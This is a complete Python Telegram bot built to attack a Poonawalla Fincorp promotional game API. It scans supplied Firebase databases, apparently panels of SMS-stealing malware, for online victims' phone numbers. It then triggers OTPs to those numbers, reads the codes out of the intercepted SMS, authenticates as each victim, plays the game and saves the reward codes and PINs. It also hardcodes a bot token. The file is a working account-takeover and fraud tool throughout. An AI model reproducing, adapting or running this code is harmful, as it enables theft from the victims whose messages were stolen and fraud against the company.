#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
P-Fincorp Telegram Bot — Firebase Scanner + Manual OTP Mode
Railway-ready (long polling, no webhook, no proxy).

Token is hardcoded below. ALLOWED_USERS optional env var.
"""

import os
import re
import time
import asyncio
import logging
from collections import Counter
from datetime import datetime

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode, ChatAction
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# ─────────────────────────────────────────────────────────────────
# CONFIG — EDIT THESE
# ─────────────────────────────────────────────────────────────────
BOT_TOKEN = "8878529173:AAGEudmva_H54NuTEfmdCdq4AKibM1M4rgM"          # <-- hardcoded

# Optional: restrict to specific Telegram user IDs.
# Empty set = allow everyone.
ALLOWED_USERS = set()                             # e.g. {123456789, 987654321}

API_ENDPOINT = "https://festive-offers.poonawallafincorp.com/api"
REQUEST_TIMEOUT = 25

REQ_HEADERS = {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "no-cache",
    "pragma": "no-cache",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": (
        "Mozilla/5.0 (Linux; Android 14; SM-A546B) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Mobile Safari/537.36"
    ),
    "referer": "https://festive-offers.poonawallafincorp.com/play-and-win",
    "origin": "https://festive-offers.poonawallafincorp.com",
}

WAITING_NUMBER, WAITING_OTP, WAITING_URLS = range(3)

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logging.getLogger("httpx").setLevel(logging.WARNING)
log = logging.getLogger("p-fincorp-bot")

USER_STATE: dict[int, dict] = {}


# ─────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────
def strip_tags(text: str) -> str:
    return re.sub(r"<[^>]+>", "", text or "").strip()


def clean_base_url(raw_url: str) -> str:
    url = raw_url.strip().rstrip("/")
    if url.endswith("/.json"):
        url = url[:-6]
    return url


def extract_phone_digits(raw_input):
    if not raw_input:
        return ""
    digits_only = re.sub(r"\D", "", str(raw_input))
    if len(digits_only) == 12 and digits_only.startswith("91"):
        digits_only = digits_only[2:]
    elif len(digits_only) == 11 and digits_only.startswith("0"):
        digits_only = digits_only[1:]
    if len(digits_only) > 10:
        digits_only = digits_only[-10:]
    if len(digits_only) == 10 and digits_only[0] in "6789":
        return digits_only
    return ""


def safe_fetch_json(url_path, timeout_sec=8):
    try:
        r = requests.get(url_path, timeout=timeout_sec)
        if r.status_code == 200:
            content = r.json()
            if content and content != "null":
                return content
    except Exception:
        pass
    return None


def extract_poonawalla_otp(message_text):
    if not message_text:
        return None
    content_str = str(message_text)
    m = re.search(r"poonawalla.*?\botp\w*.*?(\d{4,6})\b", content_str, re.IGNORECASE)
    if m:
        return m.group(1)
    fb = re.search(r"\b(\d{4,6})\b", content_str)
    if fb and ("poonawalla" in content_str.lower() or "otp" in content_str.lower()):
        return fb.group(1)
    return None


def fetch_device_sms_logs(base_url, device_id):
    clean_target = clean_base_url(base_url)
    for path in [
        f"{clean_target}/messages/{device_id}.json",
        f"{clean_target}/sms/{device_id}.json",
        f"{clean_target}/All_Users/sms/{device_id}.json",
        f"{clean_target}/inbox/{device_id}.json",
        f"{clean_target}/SMS/{device_id}.json",
    ]:
        d = safe_fetch_json(path)
        if isinstance(d, dict) and d:
            return d
    return {}


def scan_firebase_node_for_numbers(firebase_url):
    base_target = clean_base_url(firebase_url)
    discovered, seen = [], set()

    for node_key in ["clients", "devices", "users", "Profiles", "Accounts"]:
        data_packet = safe_fetch_json(f"{base_target}/{node_key}.json")
        if isinstance(data_packet, dict) and data_packet:
            for dev_id, info in data_packet.items():
                if not isinstance(info, dict):
                    continue
                status_flag = info.get("status") or info.get("online") or info.get("isOnline")
                if status_flag is True or str(status_flag).lower() in ("true", "1", "online", "active"):
                    ph = ""
                    for f in ("mobNo", "mobile", "phoneNumber", "phone", "number"):
                        ph = extract_phone_digits(info.get(f))
                        if ph:
                            break
                    if ph and ph not in seen:
                        discovered.append((ph, str(dev_id), base_target))
                        seen.add(ph)
            if discovered:
                return discovered

    for prefix_key in ["All_Users", "All_User"]:
        device_info_json = safe_fetch_json(f"{base_target}/{prefix_key}/DeviceInfo.json")
        if not isinstance(device_info_json, dict):
            continue
        sim_json = safe_fetch_json(f"{base_target}/{prefix_key}/simDetails.json") or {}
        for dev_id, info in device_info_json.items():
            if not isinstance(info, dict):
                continue
            sim_data = sim_json.get(dev_id, {}) if isinstance(sim_json, dict) else {}
            ph = ""
            for f in ("sim1Number", "sim2Number", "phoneNumber", "number", "phone", "mobile", "mobNo"):
                raw = (sim_data.get(f) if isinstance(sim_data, dict) else None) or info.get(f)
                ph = extract_phone_digits(raw)
                if ph:
                    break
            if ph and ph not in seen:
                discovered.append((ph, str(dev_id), base_target))
                seen.add(ph)
        if discovered:
            return discovered
    return discovered


def poll_for_target_otp(base_url, device_id, baseline_msg_ids, request_timestamp):
    messages = fetch_device_sms_logs(base_url, device_id)
    if not isinstance(messages, dict) or not messages:
        return None
    now = time.time()
    for msg_id, m in messages.items():
        if not isinstance(m, dict):
            continue
        body = str(m.get("body") or m.get("text") or m.get("message") or m.get("msg") or "")
        if "poonawalla" not in body.lower():
            continue
        code = extract_poonawalla_otp(body)
        if not code:
            continue
        ts = m.get("timestamp") or m.get("time") or m.get("date")
        parsed = None
        if ts:
            try:
                parsed = float(ts)
                if parsed > 1e12:
                    parsed = parsed / 1000.0
            except Exception:
                parsed = None
        if parsed is not None:
            if parsed < (request_timestamp - 10):
                continue
            if (now - parsed) > 120:
                continue
        elif msg_id in baseline_msg_ids:
            continue
        return {"otp": code, "raw_snippet": body[:60]}
    return None


# ─────────────────────────────────────────────────────────────────
# API OPERATIONS (no proxy)
# ─────────────────────────────────────────────────────────────────
def trigger_otp_request(mobile_number):
    try:
        r = requests.post(
            f"{API_ENDPOINT}/otp/send",
            headers={**REQ_HEADERS, "content-type": "application/json"},
            json={"mobile": mobile_number, "consentTerms": True, "consentCommunication": True},
            timeout=REQUEST_TIMEOUT,
        )
    except requests.RequestException as e:
        return False, f"network_error:{type(e).__name__}", 30
    if r.status_code != 200:
        return False, f"http_status_{r.status_code}", 30
    try:
        payload = r.json()
    except ValueError:
        return False, "invalid_json", 30
    if not isinstance(payload, dict) or not payload.get("success"):
        return False, str(payload.get("message") or "rejected")[:60], 30
    inner = payload.get("data") if isinstance(payload.get("data"), dict) else {}
    cooldown = int(inner.get("resendAvailableInSeconds") or 30)
    return True, "success", cooldown


def confirm_otp_token(mobile_number, otp_code):
    try:
        r = requests.post(
            f"{API_ENDPOINT}/otp/verify",
            headers={**REQ_HEADERS, "content-type": "application/json"},
            json={"mobile": mobile_number, "otp": otp_code, "referrer": "/play-and-win"},
            timeout=REQUEST_TIMEOUT,
        )
    except requests.RequestException as e:
        return None, f"network_error:{type(e).__name__}"
    if r.status_code != 200:
        return None, f"http_status_{r.status_code}"
    try:
        payload = r.json()
    except ValueError:
        return None, "invalid_json"
    if isinstance(payload, dict) and payload.get("success"):
        d = payload.get("data")
        if isinstance(d, dict) and d.get("token"):
            return d["token"], "success"
        return None, "missing_auth_token"
    return None, str(payload.get("message") or "rejected")[:60]


def execute_game_play(auth_token, game_category="SHUFFLE"):
    try:
        r = requests.post(
            f"{API_ENDPOINT}/game/play",
            headers={**REQ_HEADERS, "content-type": "application/json", "authorization": f"Bearer {auth_token}"},
            json={"gameType": game_category},
            timeout=REQUEST_TIMEOUT,
        )
        j = r.json()
        return j if isinstance(j, dict) else {}
    except Exception:
        return {}


# ─────────────────────────────────────────────────────────────────
# FILE PERSISTENCE (Railway: attach a volume at /app/data if needed)
# ─────────────────────────────────────────────────────────────────
def append_to_file(filepath, text_line):
    try:
        with open(filepath, "a", encoding="utf-8") as f:
            f.write(text_line + "\n")
    except Exception:
        pass


def export_reward(mobile_num, reward_dict):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    rtype = str(reward_dict.get("type") or "").upper()
    row = "\t".join([
        ts, mobile_num, rtype,
        str(reward_dict.get("brand", "Unknown")),
        str(reward_dict.get("rewardCode") or ""),
        str(reward_dict.get("rewardPin") or ""),
        strip_tags(str(reward_dict.get("details", ""))),
        str(reward_dict.get("redemptionUrl") or ""),
        str(reward_dict.get("validityDate") or "")[:10],
    ])
    dest = "p_coupons.txt" if rtype == "VOUCHER" else "p_deals.txt"
    append_to_file(dest, row)
    return dest


# ─────────────────────────────────────────────────────────────────
# TELEGRAM UI
# ─────────────────────────────────────────────────────────────────
def is_allowed(user_id: int) -> bool:
    return not ALLOWED_USERS or user_id in ALLOWED_USERS


def fmt_reward(reward: dict, mobile: str) -> str:
    brand = reward.get("brand", "Poonawalla Partner")
    rtype = reward.get("type", "DEAL")
    code = reward.get("rewardCode", "")
    pin = reward.get("rewardPin", "")
    details = strip_tags(str(reward.get("details", "")))
    url = reward.get("redemptionUrl", "")
    valid = str(reward.get("validityDate", ""))[:10]

    lines = [
        "🎉 *REWARD UNLOCKED*",
        "",
        f"📱 *Mobile:* `+91{mobile}`",
        f"🏷 *Brand:* {brand}",
        f"📦 *Category:* {rtype}",
    ]
    if details: lines.append(f"📝 *Offer:* {details}")
    if code:    lines.append(f"🔑 *Code:* `{code}`")
    if pin:     lines.append(f"🔒 *PIN:* `{pin}`")
    if valid:   lines.append(f"📅 *Expires:* {valid}")
    if url:     lines.append(f"🔗 [Redeem]({url})")
    return "\n".join(lines)


async def progress_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE, text: str):
    try:
        await ctx.bot.send_message(chat_id=update.effective_chat.id, text=text, parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        await update.message.reply_text("🚫 Not authorized.")
        return ConversationHandler.END

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 Firebase Auto", callback_data="mode_auto")],
        [InlineKeyboardButton("✍️ Manual Single", callback_data="mode_manual")],
        [InlineKeyboardButton("❓ Help", callback_data="help")],
    ])
    await update.message.reply_text(
        "✦ *P-Fincorp Automated Bot* ✦\n\n"
        "Live Firebase Scanner & SMS Reader\n"
        "Choose a mode below:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=kb,
    )
    return ConversationHandler.END


async def cb_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data

    if data == "help":
        await q.edit_message_text(
            "*Help*\n\n"
            "• *Firebase Auto* — send one or more Firebase RTDB URLs; bot scans for active numbers and runs the full OTP + game pipeline.\n"
            "• *Manual Single* — send your own 10-digit number, then the OTP you receive.\n\n"
            "*Commands*\n"
            "/start — menu\n"
            "/cancel — stop current flow",
            parse_mode=ParseMode.MARKDOWN,
        )
        return ConversationHandler.END

    if data == "mode_manual":
        USER_STATE[q.from_user.id] = {"mode": "manual"}
        await q.edit_message_text(
            "✍️ *Manual Mode*\n\nSend your 10-digit mobile number (e.g. `9876543210`):",
            parse_mode=ParseMode.MARKDOWN,
        )
        return WAITING_NUMBER

    if data == "mode_auto":
        USER_STATE[q.from_user.id] = {"mode": "auto", "urls": []}
        await q.edit_message_text(
            "🔥 *Firebase Auto Mode*\n\n"
            "Send Firebase RTDB URLs one per message.\n"
            "Send /run when done, or /cancel to abort.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return WAITING_URLS

    return ConversationHandler.END


# ─────────────────────────────────────────────────────────────────
# MANUAL MODE
# ─────────────────────────────────────────────────────────────────
async def manual_got_number(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    raw = (update.message.text or "").strip()
    mobile = extract_phone_digits(raw)
    if not mobile:
        await update.message.reply_text("❌ Invalid number. Send 10-digit number starting 6/7/8/9.")
        return WAITING_NUMBER

    USER_STATE.setdefault(uid, {})["mobile"] = mobile
    await update.message.chat.send_action(ChatAction.TYPING)

    sent_ok, reason, cooldown = await asyncio.to_thread(trigger_otp_request, mobile)
    if not sent_ok:
        await update.message.reply_text(f"❌ OTP send failed: `{reason}`", parse_mode=ParseMode.MARKDOWN)
        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tmanual_otp_failed\t{reason}")
        return ConversationHandler.END

    await update.message.reply_text(
        f"✅ OTP sent to `+91{mobile}`\n"
        f"⏱ Resend available in {cooldown}s\n\n"
        f"Now send the OTP you received:",
        parse_mode=ParseMode.MARKDOWN,
    )
    return WAITING_OTP


async def manual_got_otp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    otp_raw = (update.message.text or "").strip()
    otp = re.sub(r"\D", "", otp_raw)
    if len(otp) < 4 or len(otp) > 8:
        await update.message.reply_text("❌ Invalid OTP format. Send 4–8 digits.")
        return WAITING_OTP

    mobile = USER_STATE.get(uid, {}).get("mobile")
    if not mobile:
        await update.message.reply_text("⚠️ Session expired. /start again.")
        return ConversationHandler.END

    await update.message.chat.send_action(ChatAction.TYPING)
    token, err = await asyncio.to_thread(confirm_otp_token, mobile, otp)
    if not token:
        await update.message.reply_text(f"❌ Auth rejected: `{err}`", parse_mode=ParseMode.MARKDOWN)
        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tmanual_auth_rejected\t{err}")
        return ConversationHandler.END

    await update.message.reply_text("✅ Token acquired. Playing game…")
    await update.message.chat.send_action(ChatAction.TYPING)
    outcome = await asyncio.to_thread(execute_game_play, token, "SHUFFLE")

    data = outcome.get("data") if isinstance(outcome, dict) else None
    won = (data or {}).get("wonOffer") if isinstance(data, dict) else None

    if not outcome.get("success"):
        await update.message.reply_text(f"⚠️ Game failed: `{outcome.get('message','Unknown')}`", parse_mode=ParseMode.MARKDOWN)
        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tmanual_game_failed")
        return ConversationHandler.END

    if not won:
        await update.message.reply_text("📦 Game completed — no reward this time.")
        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tmanual_no_reward")
        return ConversationHandler.END

    saved = export_reward(mobile, won)
    append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tmanual_success\t{won.get('rewardCode','')}\t{won.get('type','')}")
    await update.message.reply_text(
        fmt_reward(won, mobile) + f"\n\n💾 Saved to `{saved}`",
        parse_mode=ParseMode.MARKDOWN,
        disable_web_page_preview=True,
    )
    return ConversationHandler.END


# ─────────────────────────────────────────────────────────────────
# AUTO MODE
# ─────────────────────────────────────────────────────────────────
async def auto_collect_url(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    txt = (update.message.text or "").strip()
    st = USER_STATE.setdefault(uid, {"mode": "auto", "urls": []})

    url = clean_base_url(txt)
    if not url.startswith("http"):
        await update.message.reply_text("❌ Not a valid URL.")
        return WAITING_URLS
    if url in st["urls"]:
        await update.message.reply_text("⚠️ Duplicate URL, ignored.")
        return WAITING_URLS

    st["urls"].append(url)
    await update.message.reply_text(
        f"✅ Added `#{len(st['urls'])}`:\n`{url}`\n\nSend another, or /run to start.",
        parse_mode=ParseMode.MARKDOWN,
    )
    return WAITING_URLS


async def auto_run(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    st = USER_STATE.get(uid, {})
    urls = st.get("urls", [])
    if not urls:
        await update.message.reply_text("⚠️ No URLs queued. Send at least one URL first.")
        return WAITING_URLS

    await update.message.reply_text(f"🚀 Scanning {len(urls)} panel(s)…")
    all_results = []

    for idx, panel in enumerate(urls, 1):
        await progress_cb(update, ctx, f"📡 *Panel {idx}/{len(urls)}*\n`{panel}`")

        targets = await asyncio.to_thread(scan_firebase_node_for_numbers, panel)
        if not targets:
            await progress_cb(update, ctx, f"⚠️ Panel {idx}: no active targets found.")
            continue

        await progress_cb(update, ctx, f"✅ Panel {idx}: {len(targets)} active target(s).")

        for mobile, dev_id, db_ref in targets:
            await progress_cb(
                update, ctx,
                f"▶️ Processing `+91{mobile}` (dev `{dev_id[:10]}…`)"
            )
            try:
                outcome = await process_auto_target(update, ctx, mobile, db_ref, dev_id)
                all_results.append(outcome)
            except Exception as e:
                log.exception("pipeline error")
                await progress_cb(update, ctx, f"💥 Exception: `{e}`")
                all_results.append("exception")
            await asyncio.sleep(2)

    c = Counter(all_results)
    labels = {
        "won": "🎉 Rewards Claimed",
        "timeout": "⏳ OTP Timeouts",
        "failed": "📵 Send Blocked",
        "auth_failed": "❌ Auth Rejected",
        "game_failed": "⚠️ Game Error",
        "no_reward": "📦 Empty Slot",
        "exception": "💥 Exceptions",
    }
    lines = ["📊 *Execution Summary*", ""]
    if not all_results:
        lines.append("_No targets processed._")
    else:
        for k, v in c.items():
            lines.append(f"{labels.get(k, k)}: *{v}*")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)

    USER_STATE[uid]["urls"] = []
    return ConversationHandler.END


async def process_auto_target(update, ctx, mobile, firebase_url, device_id):
    chat_id = update.effective_chat.id
    baseline = await asyncio.to_thread(fetch_device_sms_logs, firebase_url, device_id)
    baseline_keys = set((baseline or {}).keys())

    ok, reason, _ = await asyncio.to_thread(trigger_otp_request, mobile)
    if not ok:
        await ctx.bot.send_message(chat_id, f"📵 `+91{mobile}` — OTP send blocked: `{reason}`", parse_mode=ParseMode.MARKDOWN)
        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\totp_failed\t{reason}")
        return "failed"

    req_epoch = time.time()
    otp_found = None
    for attempt in range(1, 6):
        await asyncio.sleep(4)
        found = await asyncio.to_thread(
            poll_for_target_otp, firebase_url, device_id, baseline_keys, req_epoch
        )
        if found:
            otp_found = found["otp"]
            await ctx.bot.send_message(chat_id, f"📩 OTP captured for `+91{mobile}`: `{otp_found}`", parse_mode=ParseMode.MARKDOWN)
            break
        await ctx.bot.send_message(chat_id, f"…polling {attempt}/5 for `+91{mobile}`", parse_mode=ParseMode.MARKDOWN)

    if not otp_found:
        await ctx.bot.send_message(chat_id, f"⏳ `+91{mobile}` OTP timeout.", parse_mode=ParseMode.MARKDOWN)
        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\totp_timeout")
        return "timeout"

    token, err = await asyncio.to_thread(confirm_otp_token, mobile, otp_found)
    if not token:
        await ctx.bot.send_message(chat_id, f"❌ `+91{mobile}` auth rejected: `{err}`", parse_mode=ParseMode.MARKDOWN)
        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tauth_rejected\t{err}")
        return "auth_failed"

    outcome = await asyncio.to_thread(execute_game_play, token, "SHUFFLE")
    data = outcome.get("data") if isinstance(outcome, dict) else None
    won = (data or {}).get("wonOffer") if isinstance(data, dict) else None

    if not outcome.get("success"):
        await ctx.bot.send_message(chat_id, f"⚠️ `+91{mobile}` game failed.", parse_mode=ParseMode.MARKDOWN)
        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tgame_failed")
        return "game_failed"
    if not won:
        await ctx.bot.send_message(chat_id, f"📦 `+91{mobile}` no reward.", parse_mode=ParseMode.MARKDOWN)
        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tno_reward")
        return "no_reward"

    saved = export_reward(mobile, won)
    append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tsuccess\t{won.get('rewardCode','')}\t{won.get('type','')}")
    await ctx.bot.send_message(
        chat_id,
        fmt_reward(won, mobile) + f"\n\n💾 `{saved}`",
        parse_mode=ParseMode.MARKDOWN,
        disable_web_page_preview=True,
    )
    return "won"


# ─────────────────────────────────────────────────────────────────
# /cancel
# ─────────────────────────────────────────────────────────────────
async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    USER_STATE.pop(update.effective_user.id, None)
    await update.message.reply_text("🛑 Cancelled. /start to begin again.")
    return ConversationHandler.END


# ─────────────────────────────────────────────────────────────────
# BOOT
# ─────────────────────────────────────────────────────────────────
def main():
    if not BOT_TOKEN or BOT_TOKEN == "PASTE_YOUR_BOT_TOKEN_HERE":
        raise SystemExit("Set BOT_TOKEN at the top of bot.py before running.")

    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[
            CommandHandler("start", cmd_start),
            CallbackQueryHandler(cb_menu, pattern=r"^(mode_auto|mode_manual|help)$"),
        ],
        states={
            WAITING_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, manual_got_number)],
            WAITING_OTP:    [MessageHandler(filters.TEXT & ~filters.COMMAND, manual_got_otp)],
            WAITING_URLS:   [
                MessageHandler(filters.TEXT & ~filters.COMMAND, auto_collect_url),
                CommandHandler("run", auto_run),
            ],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
        allow_reentry=True,
    )

    app.add_handler(conv)
    app.add_handler(CommandHandler("cancel", cmd_cancel))

    log.info("Bot starting (long polling, no proxy)…")
    app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
